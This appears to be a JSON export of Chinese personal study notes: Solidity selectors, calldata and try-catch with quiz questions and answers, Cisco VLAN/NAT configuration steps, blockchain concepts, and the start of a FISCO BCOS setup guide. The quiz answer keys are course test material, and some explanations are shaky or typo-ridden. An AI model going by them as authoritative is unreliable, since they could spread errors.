\n当参数为0x2c44b726ADF1963cA47Af88B284C06f30380fC78时，输出的calldata为\n0x6a6278420000000000000000000000002c44b726adf1963ca47af88b284c06f30380fc78\n这段很乱的字节码可以分成两部分：\n前4个字节为函数选择器selector： 0x6a627842\n 后面32个字节为输入的参数： 0x0000000000000000000000002c44b726adf1963ca47af88b284c06f30380fc78\n其实calldata就是告诉智能合约，我要调用哪个函数，以及参数是什么。\nmethod id、selector和函数签名method id定义为函数签名的Keccak哈希后的前4个字节，当selector与method id相匹配时，即表示调用该函数，那么函数签名是什么？**\n简单介绍函数签名: 为**”函数名（逗号分隔的参数类型)”。举个例子，上面代码中mint的函数签名为“mint(address)”**。在同一个智能合约中，不同的函数有不同的函数签名，因此我们可以通过函数签名来确定要调用哪个函数。\n注意，在函数签名中，uint和int要写为uint256和int256。\n由于计算method id时，需要通过函数名和函数的参数类型来计算。\n在Solidity中，函数的参数类型主要分为：基础类型参数，固定长度类型参数，可变长度类型参数和映射类型参数。\n\n基础类型参数\n\nsolidity中，基础类型的参数有：uint256(uint8, … , uint256)、bool, address等。在计算method id时，只需要计算bytes4(keccak256(&quot;函数名(参数类型1,参数类型2,...)&quot;))\n\n固定长度类型参数\n\n通常为固定长度的数组，例如：uint256[5]等因此，在计算该函数的method id时，只需要通过bytes4(keccak256(&quot;fixedSizeParamSelector(uint256[3])&quot;))\n即可。\n\n可变长度类型参数\n\n通常为可变长的数组，例如：address[]、uint8[]、string等，\n因此在计算该函数的method id时，只需要通过\n1bytes4(keccak256(&quot;nonFixedSizeParamSelector(uint256[],string)&quot;))\n\n即可。\n\n映射类型参数\n\n映射类型参数通常有：contract、enum、struct等。在计算method id时，需要将该类型转化成为ABI类型。因此，计算该函数的method id的代码为\n1bytes4(keccak256(&quot;mappingParamSelector(address,(uint256,bytes),uint256[],uint8)&quot;))\n\n\n\n\n\n使用selector我们可以利用selector来调用目标函数。例如我想调用elementaryParamSelector函数，我只需要利用abi.encodeWithSelector将elementaryParamSelector函数的method id作为selector和参数打包编码，传给call函数：\n  1234567//使用selector来调用函数   function callWithSignature() external&#123;   ...     //调用elementaryParamSelector函数     (bool success1, bytes memory data1) = address(this).call(abi.encodeWithSelector(0x3ec37834, 1, 0));   ...   &#125;\n\n\n\n\n\ntry Catch在 Solidity 中，try-catch 可以用来捕获以下几种异常：\n\n**revert()**：手动触发的异常，通常用于返回自定义错误消息。\n**require()**：检查条件，如果条件不满足则触发异常，通常用于输入验证和状态检查。\n**assert()**：用于检查不变量（internal     consistency），如果条件不满足会触发异常，并消耗所有剩余的 gas。这种异常通常表示程序中有严重错误。\n\n因此，try-catch 可以捕获 以上所有异常，但前提是它们发生在外部调用时。例如，当调用另一个合约或使用低级调用时发生异常，try-catch 可以捕获这些错误。\ntry-catch只能被用于external函数或创建合约时constructor（被视为external函数）的调用。基本语法如下：\n12345try externalContract.f() &#123;   //call成功的情况下 运行一些代码 &#125; catch &#123;   // call失败的情况下 运行一些代码 &#125;\n\n\n\n其中externalContract.f()是某个外部合约的函数调用，try模块在调用成功的情况下运行，而catch模块则在调用失败时运行。\n同样可以使用this.f()来替代externalContract.f()，this.f()也被视作为外部调用，但不可在构造函数中使用，因为此时合约还未创建。\n如果调用的函数有返回值，那么必须在try之后声明returns(returnType val)，并且在try模块中可以使用返回的变量；如果是创建合约，那么返回值是新创建的合约变量。\n12345try externalContract.f() returns(returnType val)&#123;   // call成功的情况下 运行一些代码 &#125; catch &#123;   // call失败的情况下 运行一些代码 &#125;\n\n另外，catch模块支持捕获特殊的异常原因：\n12345678910111213141516171819try externalContract.f() returns(returnType)&#123;  // call成功的情况下 运行一些代码&#125; catch Error(string memory /*reason*/ ) &#123;  // 捕获revert(&quot;reasonString&quot;) 和 require(false, &quot;reasonString&quot;)&#125; catch Panic(uint /*errorCode*/) &#123;  // 捕获Panic导致的错误 例如assert失败 溢出 除零 数组访问越界&#125; catch (bytes memory /*lowLevelData*/) &#123;  // 如果发生了revert且上面2个异常类型匹配都失败了 会进入该分支  // 例如revert() require(false) revert自定义类型的error&#125;\n\n\n\n\n\n题：\n在代理合约中，存储所有相关的变量的是（），存储所有函数的是（），同时（）\n\n选择一个答案 \nA. 代理合约; 逻辑合约; 代理合约delegatecall逻辑合约 \nB. 代理合约; 逻辑合约; 逻辑合约delegatecall代理合约 \nC. 逻辑合约; 代理合约; 代理合约delegatecall逻辑合约\nD. 逻辑合约; 代理合约; 逻辑合约delegatecall代理合约\n解析\n在代理合约模式中，通常有两个主要组成部分：代理合约和逻辑合约。它们的职责分配如下：\n\n代理合约 存储所有相关的变量：\n\n代理合约负责持有合约的状态（即存储变量）。这意味着合约的状态信息保存在代理合约中。\n\n逻辑合约 存储所有函数：\n\n逻辑合约包含具体的业务逻辑和函数实现。它不直接持有状态，而是通过 delegatecall 被代理合约调用。\n\n代理合约使用 delegatecall 调用逻辑合约：\n\n代理合约使用 delegatecall 调用逻辑合约中的函数。在这种调用方式下，逻辑合约中的代码在代理合约的上下文中执行，这意味着逻辑合约可以通过代理合约的状态变量进行操作。\n因此，选项 A 是正确的，因为它准确地描述了代理合约和逻辑合约之间的关系和它们各自的职责。\n\n\n使用delegatecall对当前合约和目标合约的状态变量有什么要求？\n选择一个答案\nA. 变量名、变量类型、声明顺序都必须相同\nB. 变量名可以不同，变量类型、声明顺序必须相同\nC. 变量类型可以不同，变量名、声明顺序必须相同\nD. 声明顺序可以不同，变量名、变量类型必须相同\n\n\n解析\n\n状态变量在 delegatecall 中的作用：\n\no 当使用 delegatecall 调用目标合约的函数时，该函数的执行是在调用合约的存储上下文中进行的。这意味着目标合约中使用的状态变量会直接影响调用合约中的状态变量。\n\n变量名：\n\no 变量名可以不同，这是因为在调用时，delegatecall 是根据存储位置而不是变量名来访问状态变量。只要存储顺序和类型匹配，变量名的不同不会影响操作。\n\n变量类型：\n\no 变量类型必须相同，因为 delegatecall 需要确保数据的正确解码和存储。若目标合约中使用的变量类型与调用合约的状态变量类型不一致，将导致数据解码错误，从而引发异常。\n\n声明顺序：\n\n声明顺序必须相同，这是因为 Solidity 编译器在生成合约存储布局时是基于变量声明的顺序来分配存储位置的。如果顺序不同，虽然变量名可以不同，但不同的顺序会导致访问错误的数据位置\n综上：选B\n\n\n1个工厂合约PairFactory创建Pair合约的最大数量一般由什么决定？\n\n选择一个答案\nA. 1个PairFactory只能创建1个pari合约\nB. Pair合约逻辑\nC. PairFactory合约逻辑\n解析\n在 Solidity 中，工厂合约（如 PairFactory）的作用通常是用于批量创建和管理其他合约实例（例如 Pair 合约）。工厂合约能够创建的合约数量主要取决于工厂合约自身的逻辑。也就是说，PairFactory 中的代码决定了它创建 Pair 合约的具体规则和限制，例如是否允许创建多个 Pair 实例，或对创建数量施加其他限制。\n\nA. 1个PairFactory只能创建1个pair合约：不正确。工厂合约一般可以创建多个合约实例，具体数量取决于其逻辑实现。\nB. Pair合约逻辑：不正确。Pair 合约的逻辑通常只影响其自身的行为和状态，而不是 PairFactory 合约创建 Pair 合约的数量。\nC. PairFactory合约逻辑：正确。工厂合约的逻辑直接决定了它可以创建多少个 Pair 合约实例。\n\n因此，答案是 C。\n\n\n删除合约时，可以将合约中剩余的ETH发送出去： 选择一个答案 A. 正确 B. 错误\n\n解析\n在 Solidity 中使用 selfdestruct 删除合约时，可以将合约中剩余的 ETH 发送到指定的地址。selfdestruct(address payable recipient) 会销毁合约并将其剩余余额发送给 recipient 地址。因此，删除合约时确实可以将合约中的剩余 ETH 发送出去，选A。\n\n\n当我们调用智能合约时，传递给合约的数据的前若干个字节被称为“函数选择器 (Selector)”，它告诉合约我们想要调用哪个函数。假设我们想要调用的函数在智能合约中定义声明如下： \n1solidity Copy code function foo(uint256 n, address sender, string s) public view returns(bool b) \n\n那么该函数对应的函数选择器为： 选择一个答案 \nA. &quot;foo(uint256,address,string)&quot;\nB. &quot;foo(uint256 n, address sender, string s)&quot; \nC. keccak256(&quot;foo(uint256,address,string)&quot;) \nD.keccak256(&quot;foo(uint256 n, address sender, string s)&quot;)\nE. bytes4(keccak256(&quot;foo(uint256,address,string)&quot;)) \nF. bytes4(keccak256(&quot;foo(uint256 n, address sender, string s)&quot;))\n\n\n解析\n在 Solidity 中，函数选择器是由函数签名（函数名称和参数类型）经过 Keccak-256 哈希运算后生成的前 4 个字节。具体生成步骤如下：\n1.   将函数的签名（包括函数名称和参数类型，但不包含参数名称）传入 keccak256 进行哈希计算。\n在这个例子中，函数签名为 &quot;foo(uint256,address,string)&quot;\n2.   取 keccak256 哈希结果的前 4 个字节，形成 bytes4 类型的数据。\n因此，正确答案是 bytes4(keccak256(“foo(uint256,address,string)”))。\n\n\n已知函数foo在智能合约中定义声明如下：\n1solidity Copy code function foo(uint256 a) public view\n\n\n\n 而字符串&quot;foo(uint256)&quot;的keccak256哈希值为： 0x2fbebd3821c4e005fbe0a9002cc1bd25dc266d788dba1dbcb39cc66a07e7b38b 那么，当我们希望调用函数foo()时，以下生成调用数据的写法中，正确且最节省gas的一项是： 选择一个答案\n A. abi.encodeWithSignature(&quot;foo(uint256)&quot;, a) B.abi.encodeWithSelector(&quot;foo(uint256)&quot;, a)\nC.abi.encodeWithSelector(bytes(keccak256(&quot;foo(uint256)&quot;)), a) \nD. abi.encodeWithSelector(bytes4(0x2fbebd38), a)\n\n\n解析：\n·    在 Solidity 中，调用函数时可以通过函数的选择器（selector）生成调用数据。\n·    题目中已给出 “foo(uint256)” 的哈希值为 0x2fbebd3821c4e005fbe0a9002cc1bd25dc266d788dba1dbcb39cc66a07e7b38b，而选择器就是这个哈希值的前四个字节，即 0x2fbebd38。\n·    选项 D 使用了 abi.encodeWithSelector(bytes4(0x2fbebd38), a)，直接利用已知的选择器生成调用数据，这是最节省 gas 的写法，因为它避免了重复计算哈希值。\n其他选项分析：\n·    A 和 B 会导致额外的 gas 开销，因为它们需要在运行时计算 “foo(uint256)” 的哈希值。\n·    C 中的 keccak256(“foo(uint256)”) 也会增加不必要的计算，因此会消耗更多的 gas。\n正确答案选D\n\n\n如果对于某个哈希函数，我们统计大量不同字符串对应的哈希值（二进制串），发现其前 n 位全部为 0 的频率恰好约为 1&#x2F;2^n，则我们认为该哈希函数具有良好的：\n\n 选择一个答案 \nA. 单向性 \nB. 灵敏性 \nC. 高效性 \nD. 均一性 \nE. 抗碰撞性\n解析：\n·    均一性（Uniformity）指的是哈希函数生成的哈希值在输出空间中均匀分布。若哈希函数具有均一性，则任意特定模式（如前 n 位为 0）在随机情况下出现的概率为 12n\\frac{1}{2^n}2n1。\n·    题目中的现象描述了哈希值分布的均匀性，符合均一性的定义。\n其他选项分析：\n·    单向性 是指给定哈希值很难逆向推出原始输入。\n·    灵敏性 是指输入的细微变化（例如一位改变）会显著改变输出（哈希值）。\n·    高效性 指的是哈希函数计算的速度。\n·    抗碰撞性 是指很难找到不同输入生成相同的哈希值。\n因此，D. 均一性 是最符合题意的选项。\n\n1234567891011function transfer(address recipient, uint amount) external override returns (bool) &#123;\tbalanceOf[msg.sender] -= amount;\tbalanceOf[recipient] += amount;\temit Transfer(msg.sender, recipient, amount);\treturn true;&#125;\n\n\n\ntransfer函数的函数签名是transfer(address uint256)\ntransfer函数的选择器为0xa9059cbb\n解析\n通过计算 keccak256(“transfer(address,uint256)”) 得到\n计算代码：\n1234567pragma solidity ^0.8.0;contract SelectorCalculator &#123;    function getTransferSelector() public pure returns (bytes4) &#123;        return bytes4(keccak256(&quot;transfer(address,uint256)&quot;));    &#125;&#125;\n\n\n\n\n\ntry-catch捕获到异常后是否会使try-catch所在的方法调用失败？\n\n选择一个答案 A. 会 B. 不会\n解析\n 在 Solidity 中，try-catch 用于捕获外部合约调用或低级调用（如 .call）中可能发生的异常。当 try 块中的调用失败并触发异常时，程序流会进入 catch 块，而不会导致整个 try-catch 所在的函数失败。因此，只要 catch 块正确处理了异常，try-catch 所在的方法可以继续执行，不会因为捕获异常而失败。\n\n\ntry代码块内的revert是否会被catch本身捕获？\n\nA. 会 B. 不会\n解析\n因为Solidity 中，try-catch 结构用于捕获由外部调用（如其他合约的函数调用或低级调用）引发的异常。然而，try 代码块内部的 revert 并不会被同一 try-catch 结构的 catch 捕获。这是因为：\n\ntry-catch 只捕获外部合约调用中的异常。如果 try 块内的代码直接调用 revert()，这将导致该函数的整个执行环境被终止，无法进入 catch 块。\n换句话说，try-catch 结构设计的目的是为了捕获异常以便处理，而 revert() 直接触发的异常会使当前调用栈中的所有状态都回滚，而不会跳转到 catch 块。\n\n\n\n以下异常返回值类型为bytes的是： 选择一个答案 A. revert() B. require() C. assert() D. 以上都是 D是错的\n\n解析： 在 Solidity 中，revert() 可以返回一个 bytes 类型的错误信息，例如自定义的错误消息，因此 revert() 的返回值类型为 bytes。这是为了提供详细的错误描述。\n\nrequire() 和 assert() 通常不返回详细的错误数据，尤其是 assert()，它直接导致系统错误，并消耗所有剩余的 gas，不返回 bytes 类型的错误信息。\n\n因此，只有 A. revert() 返回 bytes 类型的错误信息。\n","url":"2024/11/19/solidity基础（3）/","date":"2024-11-19"},{"title":"【学习笔记】简单网络结构的搭建/vlan配置","content":"(重新粗糙存档一下，过程图基本都丢失了，仅用于个人学习笔记使用)\n\n网络基础架构图\n网络通信的原理\n软件的使用\n\n​       a. 关于拓扑图： 接入层交换机，汇聚层交换机\n​        b.技术实现6要求\nVlan trunk 不同vlan间的通信（三层交换技术）交换机的基础命令&#x2F;知识：\nvlan: 虚拟局域网\n\nvlan trunk stp 链路聚合\n\nhsrp(vrrp)——公司内部的网络系统\n\n将pc1和pc2放入不同vlan可以实现隔离\n(同一虚拟网之间的电脑可以通信，不同的不可通信)\n\nvlan范围： 1-4094\n\n关于常见接口类型：\n\n\n​\t交换机常见接口类型：有Access和trunk\n​\tAccess用来接入终端，电脑，打印机，服务器\n​\ttrunk用在交换机与交换机之间\n​\ttrunk技术解决交换机之间传输vlan数据的问题\n\n命令行敲错后，跳出卡顿：ctrl+shift+1\n\n\n三种模式：\n\nEnable \n\n#\n\nConfig\n\n\n\nExit 退出\n\n查看都在#模式中；\n\n配置文件的查看：show run (running-config)\n\n查看交换机的所有接口：show IP interface brief\n\n查看vlan：show vlan\n\n批量建立vlan两种办法: \n123vlan batch 1 to 30vlan batch 1 3 5 7 9\n\n默认情况下交换机所有端口都在：vlan1 (1003-1005为特殊接口)（端口默认用在同一vlan中）\n\n修改配置文件（配置在config）：\n\n删除操作： \n1no switch mode access\n\n\n\n删除vlan: Switch(config)#no vlan x\n\n文件的保存：\n12Switch#writeBuilding configuration...\n\n重启命令：reload\n\nPing网络：计算机 &gt; conmand prompt\n（可通过ping另一pc的地址可以查看是否通路）\n\nTrunk技术：承载不同的vlan，一般配置在交换机与交换机之间相连的端口\n\n还原：先show run，然后复制文本到别处编辑（添加no），再粘贴回去\n（show run也可用于检查）\n\n\n关于汇聚层步骤的补充：\nIp addr 的地址不是电脑的地址，是第三行需要输入的交换机的地址\n\n当需要同时配置如：f0/1 和 f0/2 两个端口时，输入 interface range f0/1,f0/2\n设置网关：\n\n\n\n对于服务器接入交换机：\n创建vlan\n将接计算机的接口加入相应的vlan\n配ip\nip routing\n\n展示路由表：Show ip route\n路由器中：\n\n添加模块时记得关电源\n添加NM-4E\n\n手机：静态路由\n工具：动态路由\n以下三步以下图为例：\n\n1. 接入层（3步）\n创建vlan\n1234configvlan 10vlan 20exit\n\n接电脑端口加入vlan\n123456789interface f0/1switchport mode accessswitchport access vlan 10exitinterface f0/2switchport mode accessswitchport access vlan 20exit\n\n\n\n将连接的端口配trunk\n12interface f0/3switchport mode trunk\n\n2.  汇聚层（2步）\n点击PC——第二行mask——配置ip地址\n在第三行填交换机地址\n\n3. 核心层（4步）核心层步骤配置的是计算机的网关\n\n创建vlan\n12345Switch(config)#vlan 10Switch(config-vlan)#vlan 20Switch(config-vlan)#exit\n\n\n\n配置trunk\n1234567Switch(config)#interface f0/1(交换机与交换机之间的端口)Switch(config-if)#switchport trunk encapsulation dot1qSwitch(config-if)#switchport mode trunkSwitch(config-if)#exit\n\n\n\n开启三层功能(支持网络层)\n1Switch(config)#ip routing(开启三层功能，支持路由)\n\n配置ip地址\n12345678Switch(config)#interface vlan 10Switch(config-if)#ip address 192.168.10.1 255.255.255.0（汇聚层步骤中设置的网关地址）Switch(config-if)#exitSwitch(config)#interface vlan 20Switch(config-if)#ip address 192.168.20.1 255.255.255.0\n\n\n配置内网\nshow ip route查看带C的路\n\n用rip加载带C的路(配置在核心交换机上)（config模式用router ip）\n123456route ripNetwork 192.168.10.0Network 192.168.20.0Network 192.168.30.0Network 192.168.40.0......\n\n上网：电脑的dns server要输入dns的网关\n\n\n\n三个server-pc分别代表web、ftp、dns\n\n\n在ftp中设置用户名和密码\n\n在第三台dns中分别在设置前两个名字（name处填）为 www.web.com 和 www.ftp.com\n\n然后分别添加上各自的ip（Address处填）\n配置完点击Add\n\n\n\n(判断能否上网)\n\n在pc——desktop——web browser处输入 www.web.com&#x2F;www.ftp.com\n\n\n(登入ftp) 在conmand prompt输入如下图操作\n\n\n\n配置路由器（注意设置显示接口）\n\n\n网段即地名\n\nOspt只管公网的网段，无需管内网的网段\n通俗讲：\n\n路由器：一般用在公网的；\n\n交换机：一般用在内网的；\n\n\n\n\n路由器R0\n对于f0/1端口：\n12Switch(config)#router rip Switch(config-router)#network 192.168.60.0\n\n对于f0/0端口：\n12Switch(config)#router rip Switch(config-router)#network 192.168.70.0\n\n对于：\n123456789101112131415  Switch(config)#interface f0/4\t  Switch(config-if)#no switchport - `Router(config)#interface f0/1`  Router(config-if)#no shutdown  Router(config-if)#ip address 192.168.60.2 255.255.255.0  - `Switch(config)#interface f0/7`  Switch(config-if)#no switchport   Switch(config-if)#ip address 192.168.70.1 255.255.255.0- `Router(config)#interface e1/0  Router(config-if)#no shutdown  Router(config-if)#ip address 192.168.70.2 255.255.255.0\n\n网络要全通：（路由问题）所有三层设备必须要内网的所有网段\n接下来配置外网通\n———————内&#x2F;外网通——————–\n路由器：配置ip 配置路由（一下名称参考上图位置，名称不固定）\nR0.1234567891011Router(config)#inter e1/0Router(config-if)#ip addr 100.100.10.1 255.255.255.0Router(config-if)#exitRouter(config)#inter f0/0Router(config-if)#ip addr 192.168.70.2 255.255.255.0Router(config-if)#exitRouter(config)#interf f0/1Router(config-if)#ip addr 192.168.60.2 255.255.255.0Router(config-if)#exitRouter(config)#router ospf 1Router(config-router)#network 100.100.10.0  0.0.0.255 area 0\n\n\nR1:12345678910Router(config)#interface f0/0Router(config-if)#ip address 100.100.10.2 255.255.255.0Router(config-if)#no shutdownRouter(config-if)#exitRouter(config)#interface f0/1Router(config-if)#no shutdownRouter(config-if)#ip address 100.100.20.1 255.255.255.0Router(config)#router ospf 1Router(config-router)#network 100.100.10.0 0.0.0.255 area 0Router(config-router)#network 100.100.20.0 0.0.0.255 area 0\n\n\nR2:123456789Router(config)#interface f0/0Router(config-if)#ip address 100.100.20.2 255.255.255.0Router(config-if)#no shutdown Router(config-if)#exitRouter(config)#interface f0/1Router(config-if)#no shutdownRouter(config-if)#ip add 100.100.30.1 255.255.255.0Router(config)#router ospf 1Router(config-router)#network 100.100.20.0  0.0.0.255 area 0\n\n\n\n———————外网互通——————–\n内网上网的问题（内部能够访问公网）——–nat网络地址转换第一步:控制内网要上网的网段；（将这些网段连上公网）123Router(config)#access-list 1 permit 192.168.10.0 0.0.0.255Router(config)#access-list 1 permit 192.168.20.0 0.0.0.255Router(config)#access-list 1 permit 192.168.30.0 0.0.0.255\n\n第二步：做NAT转换1Router(config)#ip nat inside source list 1(内网） interface e1/0（公有地址的接口）\n\n第三步：指定内外网接口12345678Router(config)#interface f0/0 （内网接口）Router(config-if)#ip nat insideRouter(config-if)#exitRouter(config)#interface f0/1  （内网接口）Router(config-if)#ip nat insideRouter(config-if)#exitRouter(config)#interface e1/0  （公有接口）Router(config-if)#ip nat outside\n\nswi01Switch(config)#ip route 0.0.0.0 0.0.0.0 192.168.70.2\n\nsw11Switch(config)#ip route 0.0.0.0 0.0.0.0 192.168.60.2\n","url":"2024/10/23/vlan配置/","date":"2024-10-23"},{"title":"区块链原理——区块链概念","content":"区块链的基本概念基本定义\n从字面上理解，区块链就是由多个记录数据的区块构成的链式数据结构。\n\n从技术角度来看，区块链是一种基于P2P网络架构的分布式账本技术系统：\n\n\n\n以“块-链”式数据结构来验证与存储账本数据\n使用密码学方法保证数据传输和访问的安全\n\n\n从应用角度来看，区块链是一种新型的无中介陌生人信任服务应用支撑平台系统。\n\n\n面向由陌生主体构成的开放网络环境\n提供分布式账本记账服务\n\n特点\n去&#x2F;弱中心化\n可溯源\n不可篡改\n数字价值唯一性（采用共识机制和密码学方法实现）\n智能合约\n开放性\n去信任\n\n类型\n公有链\n公有链（Public Blockchain），任何人（任何个体与组织）都可以参与区块链数据的维护和读取，数据完全开放透明，免费开放\n目前全球最有影响力的公有链是比特币和以太坊系统。\n\n联盟链\n联盟链（Consortium Blockchain），联盟链即区块链共识建立的范围及公共账本的公开对象为有限主体，如行业联盟成员之间，联盟成员平等参与区块链网络构建、公共账本创建与维护。\n联盟链系统一般都需要严格的身份认证和权限管理，节点的数量在一定时间段内也是确定的，适合处理组织间需要达成共识的业务，身份验证是联盟链与公有链最大区别\n区块链典型的联盟链代表技术是开源的超级账本系统（Hyperledger Fabric）\n\n私有链\n私有链（Private Blockchain）即区块链共识建立的范围及公共账本的公开对象为单一主体，单一主体对区块链的网络运行及数据处理、交换与存储具有全部权利\n私有链通常具备完善的权限管理体系，要求使用者提交身份认证。\n​    私有链也可以看作是联盟链的一种特殊形态，即联盟中只有一个成员\n\n历程\n区块链系统总体架构在体系结构上没有采用传统具有中心化服务器节点的C&#x2F;S或B&#x2F;S架构，而是采用无中心化节点的P2P体系结构（每个存储区块链与账本数据的网络节点都是对等关系）\n系统逻辑架构\n存储层\n存储层为区块链系统相关的区块链、分布式账本、智能合约、X.509数字证书、日志、配置文件等数据提供高效、可靠持久化存储服务\n区块链系统一般采用的底层数据存储机制包括Key-Value数据库和文件系统。\n\n数据层\n数据层是区块链系统的核心功能层级之一，负责定义区块链系统相关的区块、区块链、交易、账本、账户、地址等关键数据结构\n并基于底层的存储服务提供对区块链数据的安全读写访问管理\n\n网络层\n网络层是区块链系统的核心功能层级之一，负责定义区块链系统相关的P2P网络模型与通信协议\n为区块链系统各网络节点之间提供节点发现与安全连接通信机制\n为交易、区块信息在区块链网络所有节点之间提供高效传播与有效性验证机制\n\n共识层\n共识层是区块链系统的核心功能层级之一，为区块链系统提供一种或多种可选的公平、高效、安全、可靠的共识算法机制\n让所有的区块链网络节点都认可每次计算产生的新区块，并且协调保证所有区块链网络节点数据记录一致性，使区块链系统的整体状态达成一致\n\n激励层\n激励层是区块链系统可选的功能层级，以比特币、以太坊为代表的区块链系统，在共识层的功能基础上，提供了奖励加密货币的激励机制\n对于加入区块链网络的节点，都有一定机率在区块链状态改变（如产生新区块、部署智能合约、智能合约被调用等）时被区块链系统增发奖励一定数量的加密货币\n但是，以超级账本为代表的联盟链系统更多用于解决联盟内跨组织的信任服务问题，不需要类似奖励加密货币的激励机制。\n\n合约层\n合约层是区块链系统的核心功能层级之一，智能合约是将基于区块链的应用系统业务逻辑以可编程脚本或高级语言代码的形式开发后，由区块链系统的合约层负责对智能合约代码进行动态部署运行，并由系统根据既定规则的条件触发和自动执行，智能合约的源代码、调用过程与执行结果都会被记录到区块链上，杜绝合约篡改和抵赖。\n\n智能合约机制使区块链从最初单一的加密货币应用，延伸到政务服务、金融服务、征信管理、供应链管理、物联网等多个应用领域\n\n\n接口层\n接口层定义了区块链系统对应用层和外部的服务API和管理接口。\n服务API对区块链系统的功能进行封装，采用如RESTful、gRPC等远程调用协议，为应用层或外部系统提供跨平台、 便捷的区块链系统服务调用机制。\n区块链系统一般还提供命令行或Web服务接口，方便客户端或节点与区块链系统进行交互\n\n应用层\n应用层包括基于区块链的各类应用，与区块链系统的类型密切相关。\n\n对于公有链来说，最普遍的应用就是比特币、以太币等加密货币与相关的支付、交易、结算、工具等应用，以及基于智能合约的去中心化DApp应用。\n\n对于联盟链来说，更多的应用是实现跨组织或组织与个人之间的对等信任服务与数字资产化，比如跨行业联盟的征信管理、供应链上下游溯源管理、跨多个政府单位的政务协同等。\n\n对于私有链来说，更多的应用是实现政府、企业内部重要业务数据的不可篡改，降低内控监督成本。\n\n\n区块链的价值与思维区块链的价值在大幅降低第三方信任服务的成本和风险的前提下，实现信息与价值传递交换，提高服务效率，是一种创新的服务网络，是发展数字经济，构建变革性的价值生态系统的重要基础设施，具有重大的应用价值。\n区块链技术的核心价值是什么？ \n用理性的技术解决参与者之间的信任问题\n 1.满足保障网络诚信、隐私自主、价值激励、安全运行 和权利保护等公共需求，构建公共价值为基础的规则体系。\n2.让交易在透明化，减少信息传递 成本，转变为价值传递，助理解 决中小企业贷款融资难、银行风 控难、部门监管难等问题，打造 便捷高效、稳定透明的营商环境， 为经济高质量发展提供支撑。\n区块链的思维方式(1) 去&#x2F;弱&#x2F;多中心化\n​    去中心化是研究应用区块链技术首先要建立的一种思维方式。开展一项涉及信任构建的工作，首先要思考，如果使用去中心化怎样来解决？不仅高价值数据资产及其相关计算能去中心化，普通Web数据访问存储也可以去&#x2F;弱&#x2F;多中心化。通过去&#x2F;弱&#x2F;多中心化思考，可能会获得中心化信任体系下难以获取的诸多新特性、新能力。\n(2) 透明开放\n​    研究应用区块链技术，在所属的共识范围内，需要机制、规则、代码的完全透明、开放，透明、开放是让共识群体积极参与的前提和基础；黑箱运行、潜藏规则或独有专利，在区块链中难以获得更大范围的共识，并难以被更多参与者所拥护。\n(3) 协同合作\n​    不要试图一个人或一个机构独自完成所有工作和享有所有回报，要习惯人与人之间、团队与团队之间的协同合作，共定游戏规则，共建生态，共同发展产业，共获回报。\n\n区块链技术的本质是什么？\n\n带有验证的可扩展的分布式记账。分布式的公共账本\n布式账本技术：区块链是一个分布式的数据库，每个节点都保存一份完整的账本副本。通过分布式网络实现数据的冗余和备份，确保数据的安全和一致性。\n共识机制：区块链系统依靠共识算法来验证和确认交易，而不是依赖单一的信任方。常见的共识算法有工作量证明（PoW）、权益证明（PoS）、授权权益证明（DPoS）等。这些机制确保所有参与者对区块链的状态达成一致。\n加密技术：区块链利用公钥加密、哈希函数等密码学技术来确保交易的安全性和隐私性。加密技术保证了数据的不可篡改性和参与者的匿名性。\n链式结构：区块链由一系列区块按时间顺序串联而成，每个区块包含若干交易记录和一个指向前一区块的哈希值。这个链式结构确保了数据的不可篡改性。\n智能合约：智能合约是部署在区块链上的自执行代码，它们按照预定的规则自动执行和验证交易。这使得区块链不仅是一个数据存储系统，更是一个可编程的平台，能够实现复杂的业务逻辑。                                                                         \n\n什么是区块链分叉\n\n​\t区块链分叉是指由于某种原因，从区块链的某个区块开始，后续的区块构成了两条子链。\n​\t主要原因\n\n区块链软件升级\n\n​\t节点系统升级有先有后，旧节点拒绝验证新节点产生的区块，然后新、旧节点各自延续自己认为正确的链，区块链发生永久性分歧，所以分成两条链。\n\n\n区块链出块冲突\n\n​    在运行过程中，如果采用PoW工作量证明之类的需要节点竞争计算新区块的出块权的共识机制，有可能出现两个独立的节点同时求解出满足要求的哈希值结果，都生成了一个新区块，导致出块冲突，使区块链发生临时分叉。\n​\t解决办法：只承认分叉中最长的链（哪一边分叉先生成下一个区块，哪一边就是最长的链），不是最长链的分叉中的区块将被抛弃成为孤块（Orphan Block）\n课后练习（一）填空题\n1. 区块链是将分布式计算与存储、     、智能合约 、     、网络安全等多种计算机技术相互融合的应用技术创新。\n2. 信任服务模式可以分为无中介熟人信任、第三方信任和       等3种类型。\n3. 区块链分为      、     与私有链3种不同类型。\n4.            区块链系统是世界上首个经过大规模、长时间检验的加密货币系统。\n5. 比特币系统的发行量每四年减半，总量上限为      万枚，无法被超发。\n6. 在区块链系统逻辑架构中，自下而上可以分为存储层、     、网络层、    、激励层、    、接口层、应用层。\n7. 在区块链系统中，每个存储区块链与账本数据的网络节点都\n是        关系，节点之间会共享          数据。\n\n（三）简答题\n1. 请简述什么是区块链？\n2. 请简述区块链的特点有哪些？\n3. 请简述区块链有哪些类型？不同类型的区块链之间有什么区别？\n4. 区块链分叉是指由于某种原因，从区块链的某个区块开始，后续的区块构成了两条子链，请简述导致区块链分叉的主要原因？\n5. 请简述什么是软件系统架构？\n6. 请简述区块链系统逻辑架构包含哪些功能层级？\n7. 请简述什么是基于区块链的思维方式？\n8. 请简述区块链有什么价值？\n","url":"2024/11/18/【学习笔记】区块链原理——区块链概念/","date":"2024-11-18"},{"title":"外部app与区块链进行交互","content":"外部应用程序与区块链进行交互案例与流程案例大致目标\n掌握FISCO BCOS应用环境的搭建与使用（FISCO BCOS+WeBASE）\n\n掌握基于Java + SpringBoot的应用程序后端项目搭建与开发。\n\n掌握应用程序后端与FISCO BCOS链的交互。\n\n掌握应用程序前端项目搭建与开发\n\n\n应用开发整体架构示例\n应用开发整体流程示例【2】\n步骤一：构建区块链应用环境。搭建FISCO BCOS环境，搭建WeBASE-Front平台实现，部署示例智能合约。\n步骤二：构建应用程序后端。通过WeBASE- Front导出后端项目，基于WeBASE Front API开发示例智能合约使用接口。\n步骤三：构建应用程序前端。下载示例前端代码模板，区块链功能应用开发。\n步骤搭建FISCO BCOS区块链实现步骤：\n\n下载build_chain.sh工具\n\n使用build_chain.sh配置区块链\n\n使用build_chain.sh启动区块链\n\n\n命令如下：\n123456mkdir -p ~/fiscocd ~/fiscocurl -#LO https://github.com/FISCO-BCOS/FISCO- BCOS/releases/download/v2.7.2/build_chain.sh &amp;&amp; chmod u+xbuild_chain.shchmod u+x build_chain.shbash build_chain.sh -l 127.0.0.1:4 -p 30300,20200,8545bash 